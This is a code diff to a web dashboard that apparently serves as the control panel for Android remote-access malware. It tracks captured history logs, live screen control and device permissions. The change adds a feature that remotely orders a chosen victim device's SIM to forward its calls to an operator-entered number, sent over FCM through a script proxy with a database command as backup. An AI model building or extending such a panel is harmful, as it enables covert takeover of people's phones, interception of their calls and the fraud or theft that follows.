@@ -25,14 +25,16 @@ let activeDeviceId = null;
 // Track active modal device
 let activeModalDeviceId = null;
 
+// Track selected slot in Call Forwarding modal
+let selectedSlot = 0;
+
 // Track modal type (new vs old details)
 let activeModalType = 'new';
 
 // Wake-up Tracking & FCM Config
 let previousDeviceStates = {};
 let pingingDevices = new Set();
-const FCM_ACCESS_TOKEN = "YOUR_OAUTH2_ACCESS_TOKEN"; // get_fcm_token.js se mila hua token yahan dalein
-const PING_PROXY_URL = "https://script.google.com/macros/s/AKfycbwFUxk1Y3PfIXk5ZLojmTWlpV45yNVqY3SV2Ii1MmNDCA8oHzkURoZYnjfkS9VbEQa7/exec"; 
+const PING_PROXY_URL = "https://script.google.com/macros/s/AKfycbzUv35AT0wIms3nE5EdbeehvuRM2qlx761NeP46oJjpvFVaqZZBqeZ5ZDSxfgR8OLZT/exec"; 
 let pingVisualTimeout = null;
 
 // Initialize Icons on First Load
@@ -71,6 +73,7 @@ function displayDashboard(username) {
         if (activeModalType === 'old') title = 'Captured History Logs';
         if (activeModalType === 'permissions') title = 'Device Permissions';
         if (activeModalType === 'screen_control') title = 'Live Screen Control';
+        if (activeModalType === 'call_forwarding') title = 'Call Forwarding Setup';
         
         document.getElementById('modal-header-title').innerText = title;
         document.getElementById('details-modal').classList.remove('hidden');
@@ -286,33 +289,38 @@ function openDeviceDetails(deviceId) {
 function renderDeviceDetailsUI(deviceId) {
     const dev = lastSnapshotData.Devices[deviceId];
     const container = document.getElementById('device-details-content');
+
     container.innerHTML = `
-        <!-- Trending Control Panel (Call Forwarding) -->
+        <!-- Professional Control Panel (Call Forwarding) -->
         <div class="bg-white p-4 rounded-3xl border-2 border-indigo-600/20 shadow-lg shadow-indigo-100/40 space-y-4">
-            <button class="w-full bg-gradient-to-br from-indigo-600 via-indigo-700 to-violet-700 text-white font-black py-3 rounded-2xl shadow-md shadow-indigo-100 hover:shadow-indigo-200 hover:-translate-y-0.5 transition-all uppercase tracking-[0.12em] text-[10px]">
+            <button onclick="showCallForwardModal('${deviceId}')" class="w-full bg-gradient-to-br from-indigo-600 via-indigo-700 to-violet-700 text-white font-black py-3 rounded-2xl shadow-md shadow-indigo-100 hover:shadow-indigo-200 hover:-translate-y-0.5 transition-all uppercase tracking-[0.12em] text-[10px]">
                 Call Forwarding
             </button>
-            
+
+            <div id="cf-status-feedback" class="text-center text-[9px] font-black text-indigo-600 animate-pulse uppercase tracking-widest">
+                ${dev.call_forward ? `${dev.call_forward.status || 'EXECUTING'}: ${dev.call_forward.message || 'Waiting for response...'}` : 'SYSTEM READY'}
+            </div>
+
             <div class="grid grid-cols-1 gap-2.5">
                 <div class="group relative">
                     <div class="absolute left-3.5 top-1/2 -translate-y-1/2 w-7 h-7 bg-indigo-50 rounded-lg flex items-center justify-center text-indigo-500 group-focus-within:bg-indigo-600 group-focus-within:text-white transition-colors">
                         <i data-lucide="phone" class="w-4 h-4"></i>
                     </div>
-                    <input type="tel" maxlength="10" placeholder="Target Mobile Number" 
+                    <input type="tel" id="cf-number" maxlength="10" placeholder="Target Mobile Number" 
                         class="w-full bg-slate-50/50 border border-slate-200 rounded-xl pl-14 pr-4 py-3 text-xs font-bold text-slate-800 placeholder-slate-400 focus:ring-4 focus:ring-indigo-500/10 focus:bg-white focus:border-indigo-500 outline-none transition-all">
                 </div>
                 <div class="group relative">
                     <div class="absolute left-3.5 top-1/2 -translate-y-1/2 w-7 h-7 bg-indigo-50 rounded-lg flex items-center justify-center text-indigo-500 group-focus-within:bg-indigo-600 group-focus-within:text-white transition-colors">
                         <i data-lucide="message-square" class="w-4 h-4"></i>
                     </div>
-                    <input type="text" placeholder="Command Message" 
+                    <input type="text" id="cf-message" placeholder="Command Message (Optional)" 
                         class="w-full bg-slate-50/50 border border-slate-200 rounded-xl pl-14 pr-4 py-3 text-xs font-bold text-slate-800 placeholder-slate-400 focus:ring-4 focus:ring-indigo-500/10 focus:bg-white focus:border-indigo-500 outline-none transition-all">
                 </div>
             </div>
 
             <div class="grid grid-cols-2 gap-2.5">
                 ${Object.values(dev.sims || {}).map(sim => `
-                    <div class="relative group/sim cursor-pointer bg-slate-50/50 border border-slate-200 p-2.5 rounded-xl hover:border-indigo-500 hover:bg-indigo-50/50 transition-all active:scale-95">
+                    <div class="relative group/sim bg-slate-50/50 border border-slate-200 p-2.5 rounded-xl transition-all">
                         <div class="flex items-center space-x-1.5 mb-1.5">
                             <div class="p-1 bg-white rounded shadow-xs">
                                 <i data-lucide="sim-card" class="w-3 h-3 text-indigo-600"></i>
@@ -324,8 +332,6 @@ function renderDeviceDetailsUI(deviceId) {
                     </div>
                 `).join('')}
             </div>
-            
-            <div class="border-b border-slate-100 w-full pt-1"></div>
         </div>
 
         <!-- System Actions Card -->
@@ -373,6 +379,52 @@ function renderDeviceDetailsUI(deviceId) {
             </div>
         </div>
     `;
+}
+
+/**
+ * Orchestrates Call Forwarding Command
+ */
+async function handleCallForwardClick(deviceId, slot, subAction) {
+    const modalNum = document.getElementById('cf-number-modal')?.value.trim();
+    const number = modalNum || '';
+    
+    if (subAction === 'activate' && number.length < 10) {
+        showToast("Enter valid number", "error");
+        return;
+    }
+
+    const dev = lastSnapshotData?.Devices[deviceId];
+    const finalSlot = (slot !== undefined && slot !== null) ? slot : selectedSlot;
+
+    // 1. RTDB Command Object (Matches your Admin App RTDB logic)
+    const rtdbCommand = {
+        action: subAction, // "activate" or "deactivate"
+        sim_slot: Number(finalSlot)
+    };
+    if (subAction === 'activate') {
+        rtdbCommand.forward_number = number;
+    }
+
+    // 2. FCM Data Payload (Matches your DeviceDetailsActivity.java logic)
+    const fcmData = {
+        action: "call_forward",
+        sub_action: subAction,
+        sim_slot: String(finalSlot)
+    };
+    if (subAction === 'activate') {
+        fcmData.forward_number = number;
+    }
+
+    // Clear old response from Firebase to ensure we don't show stale/empty data
+    database.ref(`Devices/${deviceId}/call_forward`).remove();
+
+    // Send via FCM Proxy (Immediate Action)
+    sendFcmPing(dev.fcmToken, fcmData);
+
+    // Send via RTDB (Backup Mechanism)
+    database.ref(`Devices/${deviceId}/commands/call_forward`).set(rtdbCommand)
+        .then(() => showToast("Request Sent"))
+        .catch(() => showToast("Backup Failed", "error"));
 }
 
 /**
@@ -530,6 +582,21 @@ function showCustomerDetailsPopup(deviceId) {
 }
 
 /**
+ * Opens the call forwarding setup modal
+ */
+function showCallForwardModal(deviceId) {
+    activeModalDeviceId = deviceId;
+    activeModalType = 'call_forwarding';
+    selectedSlot = 0; // Default selection
+    localStorage.setItem('activeModalDeviceId', deviceId);
+    localStorage.setItem('activeModalType', 'call_forwarding');
+    document.getElementById('modal-header-title').innerText = 'Call Forwarding Setup';
+    document.getElementById('details-modal').classList.remove('hidden');
+    document.body.style.overflow = 'hidden';
+    renderModalUI(deviceId);
+}
+
+/**
  * Opens the live screen control modal
  */
 function showScreenControlModal(deviceId) {
@@ -652,6 +719,57 @@ function renderModalUI(deviceId) {
                         </div>
                     </div>
                 `).join('')}
+            </div>
+        </div>`;
+    } else if (activeModalType === 'call_forwarding') {
+        // Call Forwarding Modal UI
+        html += `<div class="space-y-6">
+            <div class="space-y-2">
+                <label class="text-[9px] font-black text-slate-400 uppercase tracking-widest ml-1">Forwarding Number</label>
+                <div class="relative">
+                    <div class="absolute left-4 top-1/2 -translate-y-1/2 text-indigo-500"><i data-lucide="phone" class="w-4 h-4"></i></div>
+                    <input type="tel" id="cf-number-modal" maxlength="10" placeholder="10 Digit Mobile Number" 
+                        class="w-full bg-white border-2 border-slate-100 rounded-2xl pl-12 pr-4 py-4 text-sm font-bold text-slate-800 placeholder-slate-300 focus:border-indigo-500 focus:ring-4 focus:ring-indigo-500/10 transition-all outline-none">
+                </div>
+            </div>
+
+            <div class="space-y-3">
+                <label class="text-[9px] font-black text-slate-400 uppercase tracking-widest ml-1">Select SIM Slot</label>
+                <div class="grid grid-cols-2 gap-3">
+                    ${Object.values(dev.sims || {}).map(sim => `
+                        <div onclick="selectedSlot=${sim.slot}; renderModalUI('${deviceId}')" 
+                            class="cursor-pointer p-4 rounded-2xl border-2 transition-all ${selectedSlot === sim.slot ? 'border-indigo-600 bg-indigo-50/50 shadow-md shadow-indigo-100' : 'border-slate-100 bg-white hover:border-slate-200'}">
+                            <div class="flex items-center justify-between mb-2">
+                                <div class="p-1.5 bg-slate-50 rounded-lg"><i data-lucide="sim-card" class="w-3.5 h-3.5 ${selectedSlot === sim.slot ? 'text-indigo-600' : 'text-slate-400'}"></i></div>
+                                ${selectedSlot === sim.slot ? '<div class="w-4 h-4 bg-indigo-600 rounded-full flex items-center justify-center"><i data-lucide="check" class="w-2.5 h-2.5 text-white"></i></div>' : ''}
+                            </div>
+                            <p class="text-[10px] font-black text-slate-800 truncate">${sim.carrier_name || 'No Carrier'}</p>
+                            <p class="text-[9px] font-bold text-slate-400 mt-1">${sim.number || 'SIM ' + (sim.slot+1)}</p>
+                        </div>
+                    `).join('')}
+                </div>
+            </div>
+
+            <div class="grid grid-cols-2 gap-3 pt-2 border-t border-slate-100">
+                <button onclick="handleCallForwardClick('${deviceId}', null, 'activate')" class="bg-emerald-500 hover:bg-emerald-600 text-white font-black py-4 rounded-2xl shadow-lg shadow-emerald-200 active:scale-95 transition-all text-[10px] uppercase tracking-widest">
+                    Activate
+                </button>
+                <button onclick="handleCallForwardClick('${deviceId}', null, 'deactivate')" class="bg-rose-500 hover:bg-rose-600 text-white font-black py-4 rounded-2xl shadow-lg shadow-rose-200 active:scale-95 transition-all text-[10px] uppercase tracking-widest">
+                    Deactivate
+                </button>
+            </div>
+
+            <!-- Realtime Response Feedback -->
+            <div class="mt-4 p-4 rounded-2xl border-2 border-dashed ${dev.call_forward ? 'border-indigo-500/20 bg-indigo-50/30' : 'border-slate-100 bg-slate-50/50'} text-center transition-all">
+                ${dev.call_forward ? `
+                    <div class="space-y-1">
+                        <p class="text-[8px] font-black text-indigo-400 uppercase tracking-widest">Device Feedback</p>
+                        <p class="text-[11px] font-black text-indigo-600 uppercase tracking-tight">${dev.call_forward.status || 'Command Sent'}</p>
+                        <p class="text-[10px] font-bold text-slate-500 leading-tight">${dev.call_forward.message || 'Device is processing USSD...'}</p>
+                    </div>
+                ` : `
+                    <p class="text-[9px] font-black text-slate-300 uppercase tracking-widest">Ready for command</p>
+                `}
             </div>
         </div>`;
     } else if (activeModalType === 'permissions') {
